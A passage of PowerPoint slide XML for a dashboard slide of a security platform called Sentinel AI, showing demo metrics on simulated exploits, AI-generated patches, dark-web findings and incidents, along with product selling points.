            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8915400" y="2798064"/>
            <a:ext cx="1325880" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sandbox exploits
simulated</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="TextBox 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10287000" y="2798064"/>
            <a:ext cx="1234440" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4 confirmed exploitable
2 blocked by defence</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Rectangle 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="3611880"/>
            <a:ext cx="3611880" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="63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657600"/>
            <a:ext cx="685800" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="TextBox 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1325880" y="3666744"/>
            <a:ext cx="1325880" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Patches auto-
generated by AI</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2697480" y="3666744"/>
            <a:ext cx="1234440" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2 merged · CI + re-sim
verification gate</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4206240" y="3611880"/>
            <a:ext cx="3611880" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="63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657600"/>
            <a:ext cx="685800" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="TextBox 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5120640" y="3666744"/>
            <a:ext cx="1325880" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dark web
findings active</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="TextBox 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="3666744"/>
            <a:ext cx="1234440" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1,247 creds · 12k PII
RansomHub claim live</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8001000" y="3611880"/>
            <a:ext cx="3611880" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="63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38160" y="3657600"/>
            <a:ext cx="685800" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="TextBox 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8915400" y="3666744"/>
            <a:ext cx="1325880" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Incidents being
managed</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="TextBox 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10287000" y="3666744"/>
            <a:ext cx="1234440" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2 SLA-breached
Ransomware investigation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="4617720"/>
            <a:ext cx="11338560" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="950" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>What makes Sentinel AI different:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="4892040"/>
            <a:ext cx="11338560" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✦  Exploitability over CVE count — the Exploit Lab proves what is actually exploitable in your environment, not just what is theoretically vulnerable.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="TextBox 33"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="5138928"/>
            <a:ext cx="11338560" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✦  Closed-loop remediation — Patch Automation generates, tests, and verifies fixes automatically. No manual handoff between security and engineering.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="TextBox 34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="5385816"/>
            <a:ext cx="11338560" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✦  Industry-specific context — the platform seeds data for your exact technology stack. CVEs are described in terms of your business risk, not generic technical jargon.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="TextBox 35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="5632704"/>
            <a:ext cx="11338560" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✦  Compliance as a by-product — every security action (patching, scanning, resolving incidents) automatically updates compliance controls. No separate compliance work.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="TextBox 36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="5943600"/>
            <a:ext cx="11338560" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1000" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Other industries available:  💳 NexaPay Financial  ·  🛒 ShopVault Commerce  ·  🏥 MediCore Health Systems</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="6236208"/>
            <a:ext cx="11338560" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Backend: http://localhost:8000  ·  Frontend: http://localhost:3000  ·  Powered by Supabase</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="6510528"/>
            <a:ext cx="11338560" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="2A364A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>© 2026 Sentinel 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